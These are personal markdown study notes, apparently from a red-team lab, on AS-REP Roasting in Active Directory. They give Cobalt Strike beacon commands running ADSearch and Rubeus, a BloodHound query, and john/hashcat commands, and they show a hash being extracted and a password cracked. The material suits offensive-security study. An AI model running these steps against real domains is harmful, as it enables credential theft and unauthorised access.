---
creation date: September 24th 2022
last modified date: September 24th 2022
aliases: []
tags: #📕
---

Primary Categories: { Add link(s) [[]] back to related PRIMARY categories }
Secondary Categories:  { Add link(s) [[]] back to related SECONDARY categories }
Links: {Add link(s) [[]] to related terms}
Search Tag: #📕  

# [[AS-REP Roasting]]  
___

## Description:  
If a user does not have Kerberos pre-authentication enabled, an AS-REP can be requested for that user, and part of the reply can be cracked offline to recover their plaintext password. This configuration is also enabled on the User Object and is often seen on accounts that are used on Linux systems.


In CobaltStrike:

```
beacon> execute-assembly C:\Tools\ADSearch\ADSearch\bin\Debug\ADSearch.exe --search "(&(sAMAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" --attributes cn,distinguishedname,samaccountname

[*] No domain supplied. This PC's domain will be used instead
[*] LDAP://DC=dev,DC=cyberbotic,DC=io
[*] CUSTOM SEARCH: 
[*] TOTAL NUMBER OF SEARCH RESULTS: 1
    [+] cn                : Oracle Service
    [+] distinguishedname : CN=Oracle Service,CN=Users,DC=dev,DC=cyberbotic,DC=io
    [+] samaccountname    : svc_oracle
```


In Bloodhound:
```
MATCH (u:User {dontreqpreauth:true}) RETURN u
```

Now request the AS-REP hash with:

```
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe asreproast /user:svc_oracle /nowrap

[*] Action: AS-REP roasting

[*] Target User            : svc_oracle
[*] Target Domain          : dev.cyberbotic.io

[*] Searching path 'LDAP://dc-2.dev.cyberbotic.io/DC=dev,DC=cyberbotic,DC=io' for AS-REP roastable users
[*] SamAccountName         : svc_oracle
[*] DistinguishedName      : CN=Oracle Service,CN=Users,DC=dev,DC=cyberbotic,DC=io
[*] Using domain controller: dc-2.dev.cyberbotic.io (10.10.17.71)
[*] Building AS-REQ (w/o preauth) for: 'dev.cyberbotic.io\svc_oracle'
[+] AS-REQ w/o preauth successful!
[*] AS-REP hash:

      $krb5asrep$svc_oracle@dev.cyberbotic.io:F3B1A1 [...snip...] D6D049
```

Use `--format=krb5asrep --wordlist=wordlist svc_oracle` for **john** or `-a 0 -m 18200 svc_oracle wordlist` for **hashcat**.

```
root@kali:~# john --format=krb5asrep --wordlist=wordlist svc_oracle
Passw0rd!        ($krb5asrep$svc_oracle@dev.cyberbotic.io)

```

___

## Resources:

| Hyperlink | Info |
| --------- | ---- |


Created Date: September 24th 2022 (12:29 pm)  
Last Modified Date: <%+tp.file.last_modified_date("MMMM Do YYYY (hh:ss a)")%>
